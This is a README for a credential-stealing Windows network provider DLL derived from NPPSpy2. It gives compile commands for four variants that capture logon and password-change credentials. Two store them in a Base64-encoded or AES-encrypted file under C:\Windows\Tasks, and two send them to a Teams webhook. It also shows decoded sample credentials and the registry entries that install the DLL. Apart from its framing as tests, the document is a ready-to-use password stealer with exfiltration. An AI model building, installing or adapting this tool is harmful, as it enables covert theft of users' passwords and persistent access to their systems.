# anp

Network Provider tests based on [NPPSpy2](https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy2) by [gtworek](https://github.com/gtworek).

The logging structure is: 

```
{"timestamp":"TIMESTAMP","operation":"OPERATION","domain":"DOMAIN","username":"USERNAME","password":"PASSWORD"}
```


<br>

## 1. Store in a text file + Base64-encoding

The default path is "C:\Windows\Task\default.txt" but you can customize it using the macro /DFILE_PATH:

```
cl /LD /DFILE_PATH=\"C:\\\\Windows\\\\Tasks\\\\custom_path.txt\" 1_textfile_base64.c crypt32.lib /link /OUT:anp.dll
```

This creates a file with a content similar to:

```
eyJ0aW1lc3RhbXAiOiIyMDI1LTA0LTE0IDEwOjI4OjM2Iiwib3BlcmF0aW9uIjoiUFdEX1VQREFURV9PTEQiLCJkb21haW4iOiJERVNLVE9QLTBONkc2OTYiLCJ1c2VybmFtZSI6InJpY2FyZG8iLCJwYXNzd29yZCI6InFxIn0=
eyJ0aW1lc3RhbXAiOiIyMDI1LTA0LTE0IDEwOjI4OjM2Iiwib3BlcmF0aW9uIjoiUFdEX1VQREFURV9ORVciLCJkb21haW4iOiJERVNLVE9QLTBONkc2OTYiLCJ1c2VybmFtZSI6InJpY2FyZG8iLCJwYXNzd29yZCI6InEifQ==
```

Which decoded is:

```
{"timestamp":"2025-04-14 10:28:36","operation":"PWD_UPDATE_OLD","domain":"DESKTOP-0N6G696","username":"ricardo","password":"qq"}
{"timestamp":"2025-04-14 10:28:36","operation":"PWD_UPDATE_NEW","domain":"DESKTOP-0N6G696","username":"ricardo","password":"q"}
```

<br>

## 2. Store in a text file + AES-encryption

The default path is "C:\Windows\Task\default.txt" and the default AES password is "TEST1234", but you can customize it using the macros /DFILE_PATH and /DAES_PWD:

```
cl /LD /DFILE_PATH=\"C:\\\\Windows\\\\Tasks\\\\custom_path.txt\" /DAES_PWD=\"TEST1234\" 2_textfile_aes.c crypt32.lib advapi32.lib /link /OUT:test.dll
```

This creates a file with a content similar to:

```
gT5LdF8L+zoDlUKBYU0fASbUrBst/hsTltI8aqUyQiGcvev+CtoxnIV53AEM2hdv32TknPnleRUL8eUb4AtRjCOyN9P+tICa7t0BMQAE7FZt+Z+tGpq0unJOsvDQ2VGvcG1RzLL/QrMPUUYvIM1BcEmVPYI5/KZQpr5p+8dX2yrE40QEoN79OodAAflEbh0W
gT5LdF8L+zoDlUKBYU0fASbUrBst/hsTltI8aqUyQiGcvev+CtoxnIV53AEM2hdv0Euwo4lOajrIKowzxM2qflL7XE8KeenZ/7RHu2f7q0xnu/Cl9iGiwxWz9tkCZjD0BL5j9ysFRPla4tLGU2ThIlBeYQ9dVLGiKpZbtX8liXygU4A5o20iROUMR9Ajtojc
```

You can decrypt it using *decrypt_aes*:

```
python decrypt_aes.py gT5LdF8L+zoDlUKBYU0fASbUrBst/hsTltI8aqUyQiGcvev+CtoxnIV53AEM2hdv32TknPnleRUL8eUb4AtRjCOyN9P+tICa7t0BMQAE7FZt+Z+tGpq0unJOsvDQ2VGvcG1RzLL/QrMPUUYvIM1BcEmVPYI5/KZQpr5p+8dX2yrE40QEoN79OodAAflEbh0W
python decrypt_aes.py  gT5LdF8L+zoDlUKBYU0fASbUrBst/hsTltI8aqUyQiGcvev+CtoxnIV53AEM2hdv0Euwo4lOajrIKowzxM2qflL7XE8KeenZ/7RHu2f7q0xnu/Cl9iGiwxWz9tkCZjD0BL5j9ysFRPla4tLGU2ThIlBeYQ9dVLGiKpZbtX8liXygU4A5o20iROUMR9Ajtojc
```

And you get:

```
{"timestamp":"2025-04-14 11:20:18","operation":"PWD_UPDATE_OLD","domain":"DESKTOP-0N6G696","username":"ricardo","password":"qq"}
{"timestamp":"2025-04-14 11:20:18","operation":"PWD_UPDATE_NEW","domain":"DESKTOP-0N6G696","username":"ricardo","password":"q"}
```

<br>

## 3. Send to Teams webhook + Base64-encoding

There is not a default webhook url, you have to set the value using the macro /DWEBHOOK_URL:

```
cl /LD /DWEBHOOK_URL=L\"https://...\" 3_webhook_base64.c crypt32.lib wininet.lib /link /OUT:test.dll
```

<br>

## 4. Send to Teams webhook + AES-encryption

You have to set the webhook url value using the macro /DWEBHOOK_URL, the default AES password is "TEST1234" but you can customize it using /DAES_PWD:

```
cl /LD /DWEBHOOK_URL=L\"https://...\" 4_webhook_aes.c crypt32.lib wininet.lib advapi32.lib /link /OUT:test.dll
```

<br>

--------------------

## Installation

```
HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order
- ProviderOrder -> Add anp
```

```
HKLM\SYSTEM\CurrentControlSet\Services\anp\NetworkProvider
- Class = [REG_DWORD]2
- ProviderPath = [REG_EXPAND_SZ]"C:\Users\ricardo\Desktop\test\test.dll"
- Name = [REG_SZ]"anp"
```
